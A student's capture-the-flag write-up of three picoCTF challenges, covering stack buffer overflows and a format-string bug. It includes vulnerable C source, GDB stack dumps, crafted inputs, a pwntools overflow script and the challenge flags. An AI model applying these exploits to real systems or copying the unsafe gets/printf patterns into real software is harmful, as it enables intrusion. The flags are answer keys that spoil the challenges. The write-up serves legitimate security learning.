# 1.Buffer Overflow 0  

After opening a challenge a source code was given which  was in C language which we are currently studying so i thought that this is going to be easy,
but after opening the code i found out that the code was familiar, but there was some new stuff that needed web surfing.


Connect using:
`nc saturn.picoctf.net 52857`


Contents of `vuln.c`:
```C
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){

  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler

  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1);
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
```

I went back to Pico and launched the instance, it asked for an input and i entered some random strings which in turn resulted in me getting exited from the code.
On further inspection in `vuln.c`, I could see `char buf1[100]`. Which meant `buf1` or buffer 1 was allocated a size of 100 chars. 

What really caught my attention was the function called `sigsegv_handler` after some surfing i found out what it means.
```c
void sigsegv_handler(int sig)
```
This function gets called automatically when a SIGSEGV (segmentation fault) signal occurs, sig parameter receives the signal number and Returns void because signal handlers don't return values to the caller.
After looking at the first hint i found the way to my flag
`How can you trigger the flag to print?`
Provide input longer than 16 bytes to overflow buf2 in the vuln() function and this will corrupt the stack and cause a segmentation fault finally the SIGSEGV handler triggers and prints the flag.

```c
void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}
```
On passing input of more than 16 chars, the program gave out the flag. 


# Flag: `picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}`



# 2. format string 0

 After downloading the binary and the source code, I ran the challenge using the `nc` port provided
```zsh
sparsh@LAPTOP-F80QI4V2 ~/ctf/fmstr0 $ nc mimas.picoctf.net 63143
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Breakf@st_Burger
Breakf@st_BurgerPatrick is still hungry!
Try to serve him something of larger size!
```
 On input of one of the options provided, the binary exited.
 So I opened the source code of the binary.
 
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 32
#define FLAGSIZE 64

char flag[FLAGSIZE];

void sigsegv_handler(int sig) {
    printf("\n%s\n", flag);
    fflush(stdout);
    exit(1);
}

int on_menu(char *burger, char *menu[], int count) {
    for (int i = 0; i < count; i++) {
        if (strcmp(burger, menu[i]) == 0)
            return 1;
    }
    return 0;
}

void serve_patrick();

void serve_bob();


int main(int argc, char **argv){
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL) {
        printf("%s %s", "Please create 'flag.txt' in this directory with your",
                        "own debugging flag.\n");
        exit(0);
    }

    fgets(flag, FLAGSIZE, f);
    signal(SIGSEGV, sigsegv_handler);

    gid_t gid = getegid();
    setresgid(gid, gid, gid);

    serve_patrick();

    return 0;
}

void serve_patrick() {
    printf("%s %s\n%s\n%s %s\n%s",
            "Welcome to our newly-opened burger place Pico 'n Patty!",
            "Can you help the picky customers find their favorite burger?",
            "Here comes the first customer Patrick who wants a giant bite.",
            "Please choose from the following burgers:",
            "Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe",
            "Enter your recommendation: ");
    fflush(stdout);

    char choice1[BUFSIZE];
    scanf("%s", choice1);
    char *menu1[3] = {"Breakf@st_Burger", "Gr%114d_Cheese", "Bac0n_D3luxe"};
    if (!on_menu(choice1, menu1, 3)) {
        printf("%s", "There is no such burger yet!\n");
        fflush(stdout);
    } else {
        int count = printf(choice1);
        if (count > 2 * BUFSIZE) {
            serve_bob();
        } else {
            printf("%s\n%s\n",
                    "Patrick is still hungry!",
                    "Try to serve him something of larger size!");
            fflush(stdout);
        }
    }
}

void serve_bob() {
    printf("\n%s %s\n%s %s\n%s %s\n%s",
            "Good job! Patrick is happy!",
            "Now can you serve the second customer?",
            "Sponge Bob wants something outrageous that would break the shop",
            "(better be served quick before the shop owner kicks you out!)",
            "Please choose from the following burgers:",
            "Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak",
            "Enter your recommendation: ");
    fflush(stdout);

    char choice2[BUFSIZE];
    scanf("%s", choice2);
    char *menu2[3] = {"Pe%to_Portobello", "$outhwest_Burger", "Cla%sic_Che%s%steak"};
    if (!on_menu(choice2, menu2, 3)) {
        printf("%s", "There is no such burger yet!\n");
        fflush(stdout);
    } else {
        printf(choice2);
        fflush(stdout);
    }
}
```
 Again the `segfault` was forwarded to `sigsev_handler` and it was used to print the flag, so that means I have to create some sort of an overflow here.
 The program was divided into two levels `serve_patrick` and `serve_bob`. The first level could be passed just by inputting the option which has size greater than 2 times the `BUFSIZE`  which was defined to be 32 in the definitions, so the size should be greater than `64` bytes.
 Here the option `Gr%114d_Cheese` had the substring `%114d`, on reading about it on the net, I found out that `114` in the `%d`(integer) format specifier forces it to output an integer from the memory stack which is padded to 114 characters, which is greater than `64` bytes. 
```zsh
sparsh@LAPTOP-F80QI4V2 ~/ctf/fmstr0 $ nc mimas.picoctf.net 63143
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation:
```

- I finally moved on to the next level. Here again it required you to choose an option. Looking back at the source code, I could see that there was no other option than to `segfault` to get the flag.
- So out the three options, one option caught my eye, `Cla%sic_Che%s%steak`, this string had three proper format specifiers `%s` (`Pe%to_Portobello` had `%t` but that is not a format specifier), So I inputted that and that caused the binary to go to `sigsev_handler` and print the flag. 
```zsh
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_f89c1405}
```
 On further reading, I got to know that the reason this worked was because when you don't pass any string variable and only use `%s` in `printf()`, it can cause it to read garbage values form the memory stack, it can also infer to point at memory address outside of the binary. Due to that the program opted to force it to segmentation violation.

# Flag: 'picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_f89c1405}'



# 3.Clutter Overflow 

We are provided with two files, `chall`(binary file) and `chall.c`

Contents of `chall.c`

```c
#include <stdio.h>
#include <stdlib.h>

#define SIZE 0x100
#define GOAL 0xdeadbeef

const char* HEADER = 
" ______________________________________________________________________\n"
"|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|\n"
"| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |\n"
"|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|\n"
"| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \\^ ^ |\n"
"|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \\ ^ _ ^ / |                | \\^ ^|\n"
"| ^/_\\^ ^ ^ /_________\\^ ^ ^ /_\\ | //  | /_\\ ^| |   ____  ____   | | ^ |\n"
"|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|\n"
"| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |\n"
"|^ ^ ^ ^ ^| /     (   \\ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \\|^ ^|\n"
".-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |\n"
"|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\\ |^ ^|\n"
"| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |\n"
"|'.____'_^||/!\\@@@@@/!\\|| _'______________.'|==                    =====\n"
"|\\|______|===============|________________|/|\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
"\" ||\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"  \n"
"\"\"''\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n"
"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"";

int main(void)
{
  long code = 0;
  char clutter[SIZE];

  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);
 	
  puts(HEADER); 
  puts("My room is so cluttered...");
  puts("What do you see?");

  gets(clutter);


  if (code == GOAL) {
    printf("code == 0x%llx: how did that happen??\n", GOAL);
    puts("take a flag for your troubles");
    system("cat flag.txt");
  } else {
    printf("code == 0x%llx\n", code);
    printf("code != 0x%llx :(\n", GOAL);
  }

  return 0;
}
```


This is what we can analyse from the given code.
Input is taken from `stdin` using `gets()` function, which is vulnerable to buffer overflow as seen in the buffer overflow 0 challenge. 
 The program then checks if the variable `code` = `0xdeadbeef`, if it is then it gives out the flag.
We can see that the character buffer `clutter` is allocated 256 bytes, so we need to input more than 256 chars to modify the value of the variable `code` on the stack. 

What my next step would be, is to check the stack using GDB.  



Disassembly of main function: 

```
(gdb) disas main
Dump of assembler code for function main:
=> 0x00000000004006c7 <+0>:	push   rbp
   0x00000000004006c8 <+1>:	mov    rbp,rsp
   0x00000000004006cb <+4>:	sub    rsp,0x110
   0x00000000004006d2 <+11>:	mov    QWORD PTR [rbp-0x8],0x0
   0x00000000004006da <+19>:	mov    rax,QWORD PTR [rip+0x20197f]        # 0x602060 <stdout@@GLIBC_2.2.5>
   0x00000000004006e1 <+26>:	mov    esi,0x0
   0x00000000004006e6 <+31>:	mov    rdi,rax
   0x00000000004006e9 <+34>:	call   0x4005a0 <setbuf@plt>
   0x00000000004006ee <+39>:	mov    rax,QWORD PTR [rip+0x20197b]        # 0x602070 <stdin@@GLIBC_2.2.5>
   0x00000000004006f5 <+46>:	mov    esi,0x0
   0x00000000004006fa <+51>:	mov    rdi,rax
   0x00000000004006fd <+54>:	call   0x4005a0 <setbuf@plt>
   0x0000000000400702 <+59>:	mov    rax,QWORD PTR [rip+0x201977]        # 0x602080 <stderr@@GLIBC_2.2.5>
   0x0000000000400709 <+66>:	mov    esi,0x0
   0x000000000040070e <+71>:	mov    rdi,rax
   0x0000000000400711 <+74>:	call   0x4005a0 <setbuf@plt>
   0x0000000000400716 <+79>:	mov    rax,QWORD PTR [rip+0x201933]        # 0x602050 <HEADER>
   0x000000000040071d <+86>:	mov    rdi,rax
   0x0000000000400720 <+89>:	call   0x400590 <puts@plt>
   0x0000000000400725 <+94>:	lea    rdi,[rip+0x69d]        # 0x400dc9
   0x000000000040072c <+101>:	call   0x400590 <puts@plt>
   0x0000000000400731 <+106>:	lea    rdi,[rip+0x6ac]        # 0x400de4
   0x0000000000400738 <+113>:	call   0x400590 <puts@plt>
   0x000000000040073d <+118>:	lea    rax,[rbp-0x110]
   0x0000000000400744 <+125>:	mov    rdi,rax
   0x0000000000400747 <+128>:	mov    eax,0x0
   0x000000000040074c <+133>:	call   0x4005d0 <gets@plt>
   0x0000000000400751 <+138>:	mov    eax,0xdeadbeef
   0x0000000000400756 <+143>:	cmp    QWORD PTR [rbp-0x8],rax
   0x000000000040075a <+147>:	jne    0x40078c <main+197>
   0x000000000040075c <+149>:	mov    esi,0xdeadbeef
   0x0000000000400761 <+154>:	lea    rdi,[rip+0x690]        # 0x400df8
   0x0000000000400768 <+161>:	mov    eax,0x0
   0x000000000040076d <+166>:	call   0x4005c0 <printf@plt>
   0x0000000000400772 <+171>:	lea    rdi,[rip+0x6a6]        # 0x400e1f
   0x0000000000400779 <+178>:	call   0x400590 <puts@plt>
   0x000000000040077e <+183>:	lea    rdi,[rip+0x6b8]        # 0x400e3d
   0x0000000000400785 <+190>:	call   0x4005b0 <system@plt>
   0x000000000040078a <+195>:	jmp    0x4007ba <main+243>
   0x000000000040078c <+197>:	mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000400790 <+201>:	mov    rsi,rax
   0x0000000000400793 <+204>:	lea    rdi,[rip+0x6b0]        # 0x400e4a
   0x000000000040079a <+211>:	mov    eax,0x0
   0x000000000040079f <+216>:	call   0x4005c0 <printf@plt>
   0x00000000004007a4 <+221>:	mov    esi,0xdeadbeef
   0x00000000004007a9 <+226>:	lea    rdi,[rip+0x6aa]        # 0x400e5a
   0x00000000004007b0 <+233>:	mov    eax,0x0
   0x00000000004007b5 <+238>:	call   0x4005c0 <printf@plt>
   0x00000000004007ba <+243>:	mov    eax,0x0
   0x00000000004007bf <+248>:	leave
   0x00000000004007c0 <+249>:	ret
End of assembler dump.
```

What my main aim was to check how the stack looked like while the program was running. 
I can do that using GDB by setting breakpoints before and after the `gets()` function and defining a hook-stop, which runs a set of commands when the program is run between the breakpoints.  

```
# setting breakpoints
break *0x000000000040074c
break *0x0000000000400751

# This will print the registers, the stack and the next two instructions 
define hook-step
>info registers 
>x/256wx $rsp
>x/21 $rip 
>end
```

This is how the stack looked like before the `gets()` function is run: 
```
0x7fffffffda30:	0x000022f9	0x00000000	0x00000002	0x00000000
0x7fffffffda40:	0x008c0329	0x00000000	0xffffdb08	0x00007fff
0x7fffffffda50:	0xffffdb50	0x00007fff	0xf7fdeddb	0x00007fff
0x7fffffffda60:	0x00000004	0x00000000	0x00000040	0x00000000
0x7fffffffda70:	0x00800000	0x00000000	0x00000010	0x00000000
0x7fffffffda80:	0xffffffff	0xffffffff	0x00000040	0x00000000
0x7fffffffda90:	0x00000008	0x00000000	0x00400000	0x00000000
0x7fffffffdaa0:	0x00000800	0x00000000	0x00400000	0x00000000
0x7fffffffdab0:	0x00008000	0x00000000	0x00800000	0x00000000
0x7fffffffdac0:	0x00800000	0x00000000	0x00040000	0x00000000
0x7fffffffdad0:	0x00008000	0x00000000	0xffffdb08	0x00007fff
0x7fffffffdae0:	0x00000006	0x0000008e	0x00000000	0x00000000
0x7fffffffdaf0:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdb00:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdb10:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffdb20:	0x00000000	0x00000000	0xf7fe5af0	0x00007fff
0x7fffffffdb30:	0xffffdc20	0x00007fff	0x00000000	0x00000000
0x7fffffffdb40:	0xffffdbe0	0x00007fff	0xf7c2a1ca	0x00007fff
0x7fffffffdb50:	0xffffdb90	0x00007fff	0xffffdc68	0x00007fff
0x7fffffffdb60:	0x00400040	0x00000001	0x004006c7	0x00000000
```

This is how the stack looks like after input of 256 chars: 
```
0x7fffffffda30:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffda40:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffda50:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffda60:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffda70:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffda80:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffda90:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdaa0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdab0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdac0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdad0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdae0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdaf0:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdb00:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdb10:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdb20:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffdb30:	0xffffdc00	0x00007fff	0x00000000	0x00000000
```

Lets check the position of the pointer that is being compared: 
```
=> 0x400751 <main+138>:	mov    eax,0xdeadbeef
   0x400756 <main+143>:	cmp    QWORD PTR [rbp-0x8],rax
```

`[rbp-0x8]` is being compared to `rax`, which is `0xdeadbeef`

```
(gdb) x/wx $rbp-0x8
0x7fffffffdb38:	0x00000000
```

Lets, locate this value on the stack: 

```
0x7fffffffdb30:	0xffffdc00	0x00007fff	0x00000000	0x00000000
                                            ^
                                            |
                                        This is the value that is being checked
                                        first
                                        
                                        So, we need 256 + 8 bytes of padding
                                        to reach that address and modify it. 
```


We need to input `256 + 8` bytes of padding and then add the `0xdeadbeef` value in the byte array to modify the value of the variable `code`. 

`A` -> `0x41`
`?` -> `0xde`

We need to input a unicode character, which when translated to hex, gives `0xde`, `0xad` , etc. 
This can't be done through normal `stdin`, so we need to make a script that passes in a byte array with `0xdeadbeef` in the end, and most importantly in LSB notation as the binary file is a `LSB` executable.  

Python Script: 
```python
from pwn import * 

p = remote('mars.picoctf.net', 31890) # tested it locally using process('./chall')
payload = b'A' * 264 #256 + 8

payload += p64(0xdeadbeef) # converts 0xdeadbeef to byte array 
p.sendline(payload)

response = p.recvline()
print(f"{response.decode().strip()}")
print(payload)
p.interactive()
```

Output: 
```
[+] Opening connection to mars.picoctf.net on port 31890: Done
______________________________________________________________________
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde\x00\x00\x00\x00'
[*] Switching to interactive mode
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \^ ^ |
|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \ ^ _ ^ / |                | \^ ^|
| ^/_\^ ^ ^ /_________\^ ^ ^ /_\ | //  | /_\ ^| |   ____  ____   | | ^ |
|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|
| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |
|^ ^ ^ ^ ^| /     (   \ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \|^ ^|
.-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |
|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\ |^ ^|
| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |
|'.____'_^||/!\@@@@@/!\|| _'______________.'|==                    =====
|\|______|===============|________________|/|""""""""""""""""""""""""""
" ||""""||"""""""""""""""||""""""""""""""||"""""""""""""""""""""""""""""
""''""""''"""""""""""""""''""""""""""""""''""""""""""""""""""""""""""""""
""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
My room is so cluttered...
What do you see?
code == 0xdeadbeef: how did that happen??
take a flag for your troubles
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
```


# flag: `picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}` 



